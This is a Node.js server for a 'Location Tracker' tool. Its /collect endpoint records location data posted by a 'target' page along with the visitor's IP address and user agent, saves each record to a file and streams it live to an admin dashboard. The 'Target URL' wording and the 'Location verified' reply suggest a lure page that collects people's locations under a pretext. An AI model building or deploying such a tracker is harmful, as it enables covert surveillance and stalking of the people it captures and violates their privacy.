const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store active WebSocket connections for real-time updates
const connections = new Map();

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Generate unique IDs
function generateId() {
    return Math.random().toString(36).substr(2, 9);
}

// WebSocket connection handling
wss.on('connection', (ws, req) => {
    const connectionId = generateId();
    connections.set(connectionId, ws);
    
    console.log(`🔗 New admin connected: ${connectionId}`);
    
    // Send handshake confirmation
    ws.send(JSON.stringify({
        type: 'connection_ack',
        id: connectionId,
        message: '🟢 Admin connected to live feed'
    }));

    ws.on('close', () => {
        connections.delete(connectionId);
        console.log(`❌ Admin disconnected: ${connectionId}`);
    });
    
    ws.on('error', (error) => {
        console.error(`WebSocket error for ${connectionId}:`, error);
    });
});

// Location collection endpoint
app.post('/collect', (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString(),
            targetId: generateId()
        };

        console.log('📍 LOCATION CAPTURED:', JSON.stringify(locationData, null, 2));

        // Save to file for persistence
        fs.appendFileSync('locations.json', JSON.stringify(locationData) + '\n');

        // Broadcast to all connected admin clients
        let broadcastCount = 0;
        connections.forEach((ws, id) => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'location_update',
                    data: locationData
                }));
                broadcastCount++;
            }
        });

        console.log(`📡 Broadcast sent to ${broadcastCount} admin(s)`);

        res.json({ status: 'success', message: 'Location verified and broadcasted' });
    } catch (err) {
        console.error('❌ Error handling /collect request:', err);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Serve admin dashboard
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Health check endpoint
app.get('/status', (req, res) => {
    res.json({
        status: 'running',
        activeAdmins: connections.size,
        uptime: process.uptime()
    });
});

// Start server
server.listen(3000, '0.0.0.0', () => {
    console.log('🚀 Location Tracker Server Running!');
    console.log('📱 Target URL: http://your-ip:3000/');
    console.log('👁️ Admin Dashboard: http://your-ip:3000/admin.html');
    console.log('📊 Status: http://your-ip:3000/status');
});

